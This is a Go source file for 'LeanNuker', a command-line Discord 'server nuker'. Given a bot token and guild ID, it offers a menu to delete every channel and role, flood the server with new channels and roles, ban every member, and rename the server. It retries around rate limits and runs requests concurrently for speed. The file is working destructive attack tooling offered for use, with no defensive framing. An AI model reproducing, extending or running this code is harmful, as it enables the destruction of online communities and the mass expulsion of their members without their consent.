package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	colorReset   = "\033[0m"
	colorPurple  = "\033[35m"
	colorPink    = "\033[95m"
	colorRed     = "\033[91m"
	colorGreen   = "\033[32m"
	colorDarkRed = "\033[31m"
)

const apiBase = "https://discord.com/api/v9/"

var token, guildID string
var client = &http.Client{
	Timeout: 15 * time.Second,
	Transport: &http.Transport{
		MaxIdleConns:        10,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
		TLSHandshakeTimeout: 10 * time.Second,
	},
}

func main() {
	fmt.Println(colorPurple + `
██╗     ███████╗ █████╗ ███╗   ██╗███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██║     ██╔════╝██╔══██╗████╗  ██║████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║     █████╗  ███████║██╔██╗ ██║██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║     ██╔══╝  ██╔══██║██║╚██╗██║██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
███████╗███████╗██║  ██║██║ ╚████║██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
` + colorReset)
	fmt.Println(colorPurple + "Created By OptyWine" + colorReset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print(colorPurple + "Enter Discord Bot Token: " + colorReset)
	tokenInput, _ := reader.ReadString('\n')
	token = strings.TrimSpace(tokenInput)

	fmt.Print(colorPurple + "Enter Guild ID: " + colorReset)
	guildInput, _ := reader.ReadString('\n')
	guildID = strings.TrimSpace(guildInput)

	if err := testToken(); err != nil {
		fmt.Println(colorRed + "Token test failed: " + err.Error() + colorReset)
		return
	}

	for {
		fmt.Println("\n" + colorPink + "--- LeanNuker Menu ---" + colorReset)
		fmt.Println(colorPink + "1." + colorReset + " Create Channels (bulk: name, count, type)")
		fmt.Println(colorPink + "2." + colorReset + " Delete All Channels")
		fmt.Println(colorPink + "3." + colorReset + " Create Roles (bulk: name, count)")
		fmt.Println(colorPink + "4." + colorReset + " Delete All Roles")
		fmt.Println(colorPink + "5." + colorReset + " Ban All Members")
		fmt.Println(colorPink + "6." + colorReset + " Change Server Name")
		fmt.Println(colorPink + "0." + colorReset + " Exit")
		fmt.Print(colorPurple + "Select option: " + colorReset)

		optionStr, _ := reader.ReadString('\n')
		option, err := strconv.Atoi(strings.TrimSpace(optionStr))
		if err != nil {
			fmt.Println(colorRed + "Invalid input" + colorReset)
			continue
		}

		switch option {
		case 1:
			createChannels(reader)
		case 2:
			deleteChannels()
		case 3:
			createRoles(reader)
		case 4:
			deleteRoles()
		case 5:
			banMembers()
		case 6:
			changeServerName(reader)
		case 0:
			fmt.Println(colorGreen + "Exiting..." + colorReset)
			return
		default:
			fmt.Println(colorRed + "Invalid option" + colorReset)
		}
	}
}

func makeRequest(method, endpoint string, body io.Reader, retries int) (*http.Response, error) {
	for attempt := 0; attempt <= retries; attempt++ {
		req, err := http.NewRequest(method, apiBase+endpoint, body)
		if err != nil {
			return nil, fmt.Errorf("create request: %v", err)
		}
		req.Header.Set("Authorization", "Bot "+token)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "LeanNuker/1.0")

		resp, err := client.Do(req)
		if err != nil {
			if attempt < retries {
				fmt.Printf(colorRed+"Attempt %d failed: %v, retrying in 2s\n"+colorReset, attempt+1, err)
				time.Sleep(2 * time.Second)
				continue
			}
			return nil, fmt.Errorf("send request after %d attempts: %v", retries+1, err)
		}

		if resp.StatusCode == http.StatusTooManyRequests {
			var rateLimit struct {
				RetryAfter float64 `json:"retry_after"`
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			json.Unmarshal(body, &rateLimit)
			if rateLimit.RetryAfter > 0 {
				fmt.Printf(colorRed+"Rate limited, retrying after %.2fs\n"+colorReset, rateLimit.RetryAfter)
				time.Sleep(time.Duration(rateLimit.RetryAfter*1000) * time.Millisecond)
				continue
			}
		}

		if resp.StatusCode >= 400 {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			return nil, fmt.Errorf("%s: %s", resp.Status, string(body))
		}

		return resp, nil
	}
	return nil, fmt.Errorf("max retries (%d) exceeded", retries)
}

func testToken() error {
	resp, err := makeRequest("GET", "users/@me", nil, 3)
	if err != nil {
		return fmt.Errorf("GET /users/@me: %v", err)
	}
	defer resp.Body.Close()
	fmt.Println(colorGreen + "Token validated successfully" + colorReset)
	return nil
}

func createChannels(reader *bufio.Reader) {
	fmt.Print(colorPurple + "Enter base name: " + colorReset)
	name, _ := reader.ReadString('\n')
	name = strings.TrimSpace(name)

	fmt.Print(colorPurple + "Enter count: " + colorReset)
	countStr, _ := reader.ReadString('\n')
	count, _ := strconv.Atoi(strings.TrimSpace(countStr))

	fmt.Print(colorPurple + "Enter type (0=text, 2=voice, 4=category, etc.): " + colorReset)
	typeStr, _ := reader.ReadString('\n')
	chType, _ := strconv.Atoi(strings.TrimSpace(typeStr))

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	for i := 0; i < count; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			bodyMap := map[string]interface{}{
				"name": name,
				"type": chType,
			}
			bodyJSON, _ := json.Marshal(bodyMap)
			resp, err := makeRequest("POST", "guilds/"+guildID+"/channels", strings.NewReader(string(bodyJSON)), 3)
			if err != nil {
				fmt.Printf(colorRed+"Error creating channel: %v\n"+colorReset, err)
				return
			}
			var result map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&result)
			defer resp.Body.Close()
			fmt.Printf(colorGreen+"Created channel %s%s%s\n"+colorReset, colorGreen, result["id"], colorReset)
			time.Sleep(500 * time.Millisecond)
		}()
	}
	wg.Wait()
}

func getChannels() ([]map[string]interface{}, error) {
	resp, err := makeRequest("GET", "guilds/"+guildID+"/channels", nil, 3)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var channels []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&channels); err != nil {
		return nil, fmt.Errorf("decode response: %v", err)
	}
	return channels, nil
}

func deleteChannels() {
	channels, err := getChannels()
	if err != nil {
		fmt.Println(colorRed + "Error fetching channels: " + err.Error() + colorReset)
		return
	}
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	for _, ch := range channels {
		wg.Add(1)
		go func(id string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			resp, err := makeRequest("DELETE", "channels/"+id, nil, 3)
			if err != nil {
				fmt.Printf(colorRed+"Error deleting channel: %v\n"+colorReset, err)
				return
			}
			defer resp.Body.Close()
			fmt.Printf(colorGreen+"Deleted channel %s%s%s\n"+colorReset, colorDarkRed, id, colorReset)
			time.Sleep(500 * time.Millisecond)
		}(ch["id"].(string))
	}
	wg.Wait()
}

func createRoles(reader *bufio.Reader) {
	fmt.Print(colorPurple + "Enter base name: " + colorReset)
	name, _ := reader.ReadString('\n')
	name = strings.TrimSpace(name)

	fmt.Print(colorPurple + "Enter count: " + colorReset)
	countStr, _ := reader.ReadString('\n')
	count, _ := strconv.Atoi(strings.TrimSpace(countStr))

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	for i := 0; i < count; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			bodyMap := map[string]string{
				"name": name,
			}
			bodyJSON, _ := json.Marshal(bodyMap)
			resp, err := makeRequest("POST", "guilds/"+guildID+"/roles", strings.NewReader(string(bodyJSON)), 3)
			if err != nil {
				fmt.Printf(colorRed+"Error creating role: %v\n"+colorReset, err)
				return
			}
			var result map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&result)
			defer resp.Body.Close()
			fmt.Printf(colorGreen+"Created Role %s%s%s\n"+colorReset, colorGreen, result["id"], colorReset)
			time.Sleep(500 * time.Millisecond)
		}()
	}
	wg.Wait()
}

func getRoles() ([]map[string]interface{}, error) {
	resp, err := makeRequest("GET", "guilds/"+guildID+"/roles", nil, 3)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var roles []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&roles); err != nil {
		return nil, fmt.Errorf("decode response: %v", err)
	}
	return roles, nil
}

func deleteRoles() {
	roles, err := getRoles()
	if err != nil {
		fmt.Println(colorRed + "Error fetching roles: " + err.Error() + colorReset)
		return
	}
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	for _, role := range roles {
		wg.Add(1)
		go func(id string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			resp, err := makeRequest("DELETE", "guilds/"+guildID+"/roles/"+id, nil, 3)
			if err != nil {
				fmt.Printf(colorRed+"Error deleting role: %v\n"+colorReset, err)
				return
			}
			defer resp.Body.Close()
			fmt.Printf(colorGreen+"Deleted role %s%s%s\n"+colorReset, colorDarkRed, id, colorReset)
			time.Sleep(500 * time.Millisecond)
		}(role["id"].(string))
	}
	wg.Wait()
}

func getAllMembers() ([]map[string]interface{}, error) {
	var members []map[string]interface{}
	after := ""
	for {
		query := "?limit=1000"
		if after != "" {
			query += "&after=" + after
		}
		resp, err := makeRequest("GET", "guilds/"+guildID+"/members"+query, nil, 3)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		var batch []map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&batch); err != nil {
			return nil, fmt.Errorf("decode response: %v", err)
		}
		members = append(members, batch...)
		if len(batch) < 1000 {
			break
		}
		after = batch[len(batch)-1]["user"].(map[string]interface{})["id"].(string)
		time.Sleep(1 * time.Second)
	}
	return members, nil
}

func banMembers() {
	members, err := getAllMembers()
	if err != nil {
		fmt.Println(colorRed + "Error fetching members: " + err.Error() + colorReset)
		return
	}
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	for _, mem := range members {
		wg.Add(1)
		go func(id string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()
			bodyMap := map[string]int{"delete_message_seconds": 0}
			bodyJSON, _ := json.Marshal(bodyMap)
			resp, err := makeRequest("PUT", "guilds/"+guildID+"/bans/"+id, strings.NewReader(string(bodyJSON)), 3)
			if err != nil {
				fmt.Printf(colorRed+"Error banning %s: %v\n"+colorReset, id, err)
				return
			}
			defer resp.Body.Close()
			fmt.Printf(colorGreen+"Banned %s\n"+colorReset, id)
			time.Sleep(500 * time.Millisecond)
		}(mem["user"].(map[string]interface{})["id"].(string))
	}
	wg.Wait()
}

func changeServerName(reader *bufio.Reader) {
	fmt.Print(colorPurple + "Enter new server name: " + colorReset)
	name, _ := reader.ReadString('\n')
	name = strings.TrimSpace(name)

	bodyMap := map[string]string{"name": name}
	bodyJSON, _ := json.Marshal(bodyMap)
	resp, err := makeRequest("PATCH", "guilds/"+guildID, strings.NewReader(string(bodyJSON)), 3)
	if err != nil {
		fmt.Println(colorRed + "Error changing name: " + err.Error() + colorReset)
		return
	}
	defer resp.Body.Close()
	fmt.Printf(colorGreen+"server name changed to %s%s%s\n"+colorReset, colorPink, name, colorReset)
}